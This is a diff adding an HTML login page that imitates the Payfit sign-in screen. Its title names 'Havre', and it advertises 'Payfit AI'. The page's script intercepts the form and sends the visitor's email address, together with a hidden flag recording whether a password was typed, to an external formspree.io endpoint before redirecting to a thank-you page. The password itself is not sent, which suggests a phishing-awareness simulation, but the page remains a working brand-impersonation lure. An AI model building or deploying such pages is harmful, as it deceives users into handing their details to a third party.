@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion — Havre</title>
+
+  <style>
+    :root {
+      --navy: #1B2A4A;
+      --navy-dark: #121D33;
+      --cream: #F7F5F0;
+      --teal: #3E7C74;
+      --teal-dark: #2E5F58;
+      --ink: #2B2822;
+      --ink-soft: #6B6659;
+      --line: #DEDACF;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: "Georgia", "Iowan Old Style", serif;
+      color: var(--ink);
+      background: var(--cream);
+    }
+
+    .page {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* ---- Panneau de gauche ---- */
+    .brand {
+      flex: 1 1 45%;
+      background: var(--navy);
+      color: var(--cream);
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 48px 56px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .brand::after {
+      content: "";
+      position: absolute;
+      right: -120px;
+      bottom: -120px;
+      width: 360px;
+      height: 360px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 30%, var(--teal) 0%, transparent 70%);
+      opacity: 0.55;
+    }
+
+    .brand-mark {
+      font-size: 22px;
+      letter-spacing: 0.02em;
+      font-weight: 600;
+      z-index: 1;
+    }
+
+    .brand-quote {
+      max-width: 380px;
+      z-index: 1;
+    }
+
+    .brand-quote p {
+      font-size: 28px;
+      line-height: 1.4;
+      margin: 0 0 16px;
+    }
+
+    .brand-quote span {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 14px;
+      color: #C7CEDB;
+    }
+
+    .brand-foot {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 12px;
+      color: #8891A8;
+      z-index: 1;
+    }
+
+    /* ---- Formulaire ---- */
+    .form-panel {
+      flex: 1 1 55%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 24px;
+    }
+
+    .form-box {
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .form-box h1 {
+      font-size: 26px;
+      margin: 0 0 8px;
+    }
+
+    .form-box .sub {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 14px;
+      color: var(--ink-soft);
+      margin: 0 0 32px;
+    }
+
+    label {
+      display: block;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 13px;
+      color: var(--ink);
+      margin-bottom: 6px;
+    }
+
+    .field {
+      margin-bottom: 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 15px;
+      border: 1px solid var(--line);
+      border-radius: 4px;
+      background: #fff;
+      color: var(--ink);
+    }
+
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: var(--teal);
+      box-shadow: 0 0 0 3px rgba(62, 124, 116, 0.15);
+    }
+
+    .row-between {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 13px;
+      margin-bottom: 28px;
+    }
+
+    .row-between a {
+      color: var(--teal-dark);
+      text-decoration: none;
+    }
+
+    .row-between a:hover {
+      text-decoration: underline;
+    }
+
+    .checkbox-line {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--ink-soft);
+    }
+
+    button.submit {
+      width: 100%;
+      padding: 13px;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      color: #fff;
+      background: var(--navy);
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.15s ease;
+    }
+
+    button.submit:hover {
+      background: var(--navy-dark);
+    }
+
+    button.submit:focus-visible {
+      outline: 2px solid var(--teal);
+      outline-offset: 2px;
+    }
+
+    .help {
+      margin-top: 24px;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 13px;
+      color: var(--ink-soft);
+      text-align: center;
+    }
+
+    .help a {
+      color: var(--teal-dark);
+      text-decoration: none;
+    }
+
+    @media (max-width: 760px) {
+      .page { flex-direction: column; }
+      .brand { padding: 32px; }
+      .brand-quote p { font-size: 22px; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * { transition: none !important; }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page">
+
+    <!-- Panneau de marque -->
+    <div class="brand">
+      <div class="brand-mark">Payfit</div>
+
+      <div class="brand-quote">
+        <p>Payfit AI</p>
+        <span>Le premier agent IA dédié à la paie et RH qui vous accompagne 24/7 avec des réponses fiables et personnalisées</span>
+        <p></p>
+        <button type="submit" class="submit">Découvir Payfit AI</button>
+      </div>
+
+      <div class="brand-foot">© Politique de confidentialité Aide</div>
+    </div>
+
+    <!-- Formulaire -->
+    <div class="form-panel">
+      <form class="form-box" id="login-form">
+        <h1>Bienvenue</h1>
+        <p class="sub">Connectez-vous ou crée un compte pour accéder à Payfit</p>
+
+        <div class="field">
+          <label for="email">Adresse e-mail</label>
+          <input type="email" id="email" name="email" placeholder="prenom.nom@entreprise.fr" required>
+        </div>
+
+        <div class="field">
+          <label for="password">Mot de passe</label>
+          <input type="password" id="password" placeholder="••••••••" required>
+        </div>
+
+        <div class="row-between">
+          <label class="checkbox-line">
+            <input type="checkbox" id="remember" name="remember">
+            Rester connecté
+          </label>
+          <a href="#">Mot de passe oublié ?</a>
+        </div>
+
+        <input type="hidden" name="password_entered" id="password_entered" value="non">
+
+        <button type="submit" class="submit">Continuer</button>
+
+        <p class="help">Pas encore de compte ? <a href="#">Contactez votre administrateur</a></p>
+      </form>
+    </div>
+
+  </div>
+
+  <script>
+    const form = document.getElementById("login-form");
+    const password = document.getElementById("password");
+    const passwordEntered = document.getElementById("password_entered");
+
+    password.addEventListener("input", function () {
+      passwordEntered.value = password.value.length > 0 ? "oui" : "non";
+    });
+
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+      const data = new FormData(form);
+
+      await fetch("https://formspree.io/f/mqpazgeo", {
+        method: "POST",
+        body: data,
+        headers: { "Accept": "application/json" }
+      });
+
+      window.location.href = "merci.html";
+    });
+  </script>
+</body>
+</html>
